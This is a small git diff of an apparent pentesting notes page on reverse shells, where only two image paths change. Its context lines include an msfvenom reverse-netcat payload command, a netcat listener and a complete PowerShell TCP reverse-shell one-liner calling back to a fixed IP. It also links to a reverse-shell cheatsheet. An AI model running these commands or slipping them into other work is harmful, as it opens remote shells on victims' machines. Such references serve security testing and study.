@@ -37,7 +37,7 @@ nc -u -lvp 4242
   * `Reverse shell command without quotes` 
     * `msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.137.141 LPORT=8888 R`
 
-![](../../.gitbook/assets/image%20%2897%29.png)
+![](../../../.gitbook/assets/image%20%2897%29.png)
 
 ## PHP
 
@@ -96,7 +96,7 @@ p.waitFor()
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-![](../../.gitbook/assets/image%20%2818%29.png)
+![](../../../.gitbook/assets/image%20%2818%29.png)
 
 Ref : [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
